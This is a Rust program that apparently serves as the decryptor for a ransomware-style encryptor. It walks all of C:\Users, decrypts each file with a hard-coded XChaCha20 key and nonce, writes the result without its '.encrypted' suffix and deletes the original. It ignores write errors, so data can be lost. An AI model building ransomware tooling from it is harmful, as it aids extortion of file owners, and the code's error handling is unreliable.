use walkdir::WalkDir;
use walkdir::DirEntry;
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    XChaCha20Poly1305
};
use rand::{rngs::OsRng, RngCore};
use std::fs;
use anyhow::anyhow;

fn main() {
    let key = [126, 174, 231, 244, 185, 39, 152, 10, 223, 167, 148, 254, 28, 186, 115, 195, 87, 111, 193, 20, 98, 249, 212, 123, 151, 4, 230, 65, 68, 83, 45, 49];
    let nonce = [99, 17, 194, 93, 155, 32, 56, 126, 242, 173, 112, 241, 183, 96, 191, 111, 77, 40, 67, 80, 197, 145, 32, 143];
    let mut all_files: Vec<DirEntry> = Vec::new();
    for entry in WalkDir::new("C:\\Users").into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            all_files.push(entry)
        }
    }
    
    for entry in all_files{
        if let Some(filepath) = entry.path().as_os_str().to_str() {
            decrypt_sm_file(filepath, &key, &nonce);
        }
    }
}

fn decrypt_sm_file(filepath: &str, key: &[u8; 32], nonce: &[u8; 24]) -> Result<(), anyhow::Error> {
    let cipher = XChaCha20Poly1305::new(key.into());
    let contents = fs::read(filepath)?;
    let decrypted_file = cipher
        .decrypt(nonce.into(), contents.as_ref())
        .map_err(|err| anyhow!("Decrypting small file: {}", err))?;
    fs::write(filepath.replace(".encrypted", ""), decrypted_file);
    fs::remove_file(filepath)?;
    Ok(())
}